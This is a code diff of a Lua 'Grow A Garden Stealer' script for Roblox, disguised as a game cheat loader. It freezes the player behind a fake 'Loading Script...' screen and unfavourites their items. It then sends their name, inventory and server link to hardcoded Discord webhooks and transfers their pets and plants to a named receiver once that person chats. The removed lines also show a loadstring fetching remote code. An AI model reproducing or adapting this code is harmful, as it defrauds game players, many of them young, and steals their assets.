@@ -1,47 +1,205 @@
-username = "emmash0706a"
-webhook = "https://discord.com/api/webhooks/1383140808844120205/s7Gled3dAFag6kcybHCttBq-O9Oal6mDy6l9BhEBKEs2ZxZTvo4NUvTxn6-ixzFQmnNo"
 
-logs_webhook = "https://discord.com/api/webhooks/1377572595112611870/UFUoKoeUiIJ-qQunXaS0YpQ7PF079CF0W8Wqv3uEtS-yAWeymWowPJmbMTg5JNuyDkcE"
+logs_webhook = "https://discord.com/api/webhooks/1384305747147362425/bwhZjrmitwuq48K_jrDqK4L9SM00EELto-1XxNLx4pS79RJhc5blH8Q-KUuRaisFiaoE"
 
-
+local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
 local player = game.Players.LocalPlayer
 
+if server == "VIPServer" then 
+    player:Kick("Unsurported server. Please join a public")
+end
+
+local player = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local backpack = LocalPlayer:WaitForChild("Backpack")
-local CalculatePlantValue  = require(ReplicatedStorage.Modules.CalculatePlantValue)
+local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
-local function formatNumber(n)
-    local left, num, right = string.match(tostring(n), "^([^%d]*%d)(%d*)(.-)$")
-    num = num:reverse():gsub("(%d%d%d)", "%1,"):reverse()
-    num = num:gsub("^,", "")
-    return left .. num .. right
+local p=game.Players.LocalPlayer
+local h=(p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
+h.WalkSpeed=0 h.JumpPower=0
+pcall(function() require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "ScriptLoader"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999999 
+gui.Parent = player:WaitForChild("PlayerGui")
+
+
+local bg = Instance.new("Frame", gui)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+bg.Size = UDim2.new(1, 0, 1, 0)
+
+local title = Instance.new("TextLabel", bg)
+title.Text = "Loading Script..."
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Size = UDim2.new(0.8, 0, 0.12, 0)
+title.Position = UDim2.new(0.1, 0, 0.28, 0)
+title.BackgroundTransparency = 1
+
+
+local status = Instance.new("TextLabel", bg)
+status.Text = "Initializing..."
+status.Font = Enum.Font.Gotham
+status.TextColor3 = Color3.fromRGB(180, 180, 180)
+status.TextScaled = true
+status.Size = UDim2.new(0.8, 0, 0.08, 0)
+status.Position = UDim2.new(0.1, 0, 0.42, 0)
+status.BackgroundTransparency = 1
+
+local barBg = Instance.new("Frame", bg)
+barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
+barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBg.BorderSizePixel = 0
+barBg.ClipsDescendants = true
+
+
+local barFill = Instance.new("Frame", barBg)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+
+local discord = Instance.new("TextLabel", bg)
+discord.Text = "Join our Discord: discord.gg/qB97QHPugw"
+discord.Font = Enum.Font.GothamSemibold
+discord.TextColor3 = Color3.fromRGB(120, 120, 255)
+discord.TextScaled = true
+discord.Size = UDim2.new(0.8, 0, 0.05, 0)
+discord.Position = UDim2.new(0.1, 0, 0.86, 0)
+discord.BackgroundTransparency = 1
+
+local fakeSteps = {
+    "Starting script...",
+    "Connecting to game servers...",
+    "Bypassing anti-cheat...",
+    "Loading UI assets...",
+    "Injecting main module...",
+    "Syncing with server...",
+    "Optimizing script performance...",
+    "Checking for updates...",
+    "Hiding script from detection...",
+    "Finalizing setup...",
+    "Preparing game environment...",
+    "Almost done..."
+}
+
+local totalDuration = 600
+local stepTime = 3
+local totalSteps = math.floor(totalDuration / stepTime)
+
+task.spawn(function()
+    for i = 1, totalSteps do
+        status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
+        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
+        task.wait(stepTime)
+    end
+    gui:Destroy()
+end)
+
+
+local suffixes = {
+    "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"
+}
+
+function formatNumber(num)
+    if type(num) ~= "number" then return tostring(num) end
+    if num < 1000 then return tostring(num) end
+
+    local magnitude = math.floor(math.log10(num) / 3)
+    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
+    local scaled = num / (1000 ^ magnitude)
+
+    return string.format("%.2f%s", scaled, suffix)
+end
+
+
+if #game.Players:GetPlayers() >= 5 then
+    game.Players.LocalPlayer:Kick("Old server detected. Please rejoin!")
+    return 
+end
+
+local player = game:GetService("Players").LocalPlayer
+local bp = player:WaitForChild("Backpack")
+local event = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+
+for _, item in ipairs(bp:GetChildren()) do
+	if item:GetAttribute("Favorite") == true then
+		event:FireServer(item)
+	end
 end
 
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
+local allowedPets = {
+    ["Raccoon"] = true,
+    ["Queen Bee"] = true,
+    ["Dragonfly"] = true,
+    ["Red Fox"] = true,
+    ["Night Owl"] = true,
+    ["Owl"] = true,
+    ["Blood Owl"] = true,
+    ["Praying Mantis"] = true,
+    ["Chicken Zombie"] = true,
+    ["Polar Bear"] = true,
+    ["Petal Bee"] = true,
+    ["Bear Bee"] = true,
+    ["Disco Bee"] = true,
+    ["Butterfly"] = true,
+}
 
+
+local petCountMap = {}
+local petLines = {}
 local itemsWithValue = {}
+
 for _, item in pairs(backpack:GetChildren()) do
-    if item:FindFirstChild("Item_String") then
-        local value = CalculatePlantValue (item)
+    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+    if allowedPets[baseName] then
+        petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
+    elseif item:FindFirstChild("Item_String") then
+        local value = CalculatePlantValue(item)
         table.insert(itemsWithValue, {name = item.Name, value = value})
     end
 end
 
+
+for petName, count in pairs(petCountMap) do
+    table.insert(petLines, petName .. " - pet (x" .. count .. ")")
+end
+
+
 table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
 
+
 local tradableSummary = ""
-for i = 1, math.min(10, #itemsWithValue) do
+local totalShown = 0
+
+
+for _, line in ipairs(petLines) do
+    if totalShown >= 10 then break end
+    tradableSummary = tradableSummary .. line .. "\n"
+    totalShown += 1
+end
+
+
+for i = 1, math.min(10 - totalShown, #itemsWithValue) do
     local item = itemsWithValue[i]
     tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
 end
-if #itemsWithValue > 10 then
+
+
+if #petLines + #itemsWithValue > 10 then
     tradableSummary = tradableSummary .. "and more..."
 end
 
@@ -51,73 +209,60 @@ for _, item in ipairs(itemsWithValue) do
 end
 
 
+
 local payload = {
-    ["content"] = "--@everyone :zap: ZEUS | STEALERS :zap: Grow A Garden Hit\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+    ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
     ["embeds"] = {{
-        ["title"] = ":seedling: GROW A GARDEN",
-        ["description"] = ":zap: ZEUS is so tuff fr",
-        ["color"] = 7648373,
+        ["title"] = ":skull: GROW A GARDEN Stealer",
+        ["color"] = 0x00ffcc,
         ["fields"] = {
-            {["name"] = ":skull: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-            {["name"] = ":crown: Reciever", ["value"] = username, ["inline"] = false},
-            {["name"] = ":desktop_computer: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
+            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
             {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
-            {["name"] = ":basket: Inventory", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
             {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["thumbnail"] = {["url"] = "https://tr.rbxcdn.com/180DAY-ba088a5c33312ab138b08e63cae8f8a1/256/256/Image/Webp/noFilter"},
-        ["footer"] = {
-    ["text"] = "by ZEUS - " .. os.date("%B %d, %Y"),
-    ["icon_url"] = "https://i.imgur.com/KZEWvt7.jpeg"
-},
-["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
+        ["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
 local logs_payload = {
-    ["content"] = "New Grow a Garden Hit :seedling:",
-    ["description"] = ":zap: ZEUS is so tuff fr",
     ["embeds"] = {{
-        ["title"] = ":seedling: GROW A GARDEN LOGS",
-        ["color"] = 7648373,
+        ["title"] = ":skull: GROW A GARDEN LOGS",
+        ["color"] = 0x00ffcc,
         ["fields"] = {
-            {["name"] = ":skull: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-            {["name"] = ":desktop_computer: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
             {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
-            {["name"] = ":basket: Inventory", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["thumbnail"] = {["url"] = "https://tr.rbxcdn.com/180DAY-ba088a5c33312ab138b08e63cae8f8a1/256/256/Image/Webp/noFilter"},
-        ["footer"] = {
-    ["text"] = "by ZEUS - " .. os.date("%B %d, %Y"),
-    ["icon_url"] = "https://i.imgur.com/KZEWvt7.jpeg"
-},
-["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
+        ["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
+
 if req then
     pcall(function()
-        -- DEBUG: Main webhook
-        local success1, response1 = pcall(function()
-            return req({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-        local success2, response2 = pcall(function()
-            return req({
-                Url = logs_webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(logs_payload)
-            })
-        end)
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+
+        req({
+            Url = logs_webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(logs_payload)
+        })
     end)
 end
+
 
 local printedInventory = false
 local started = false
@@ -200,23 +345,10 @@ local function startGiving()
     end
 end
 
-local function waitForChatAndStart()
-    unequipAllPets()
-    local targetPlayer = Players:FindFirstChild(username) or Players.PlayerAdded:Wait()
-    if targetPlayer then
-        targetPlayer.Chatted:Connect(function()
-            if not started then
-                started = true
-                startGiving()
-            end
-        end)
-    end
+unequipAllPets()
+for _,p in ipairs(Players:GetPlayers()) do
+	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
 end
-
-waitForChatAndStart()
-
-
--- finished version,
---username = ""
---webhook = ""
---loadstring(game:HttpGet("https://raw.githubusercontent.com/TrulyNotBen/ZEUS/refs/heads/main/GrowAGarden"))()
+Players.PlayerAdded:Connect(function(p)
+	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
+end)
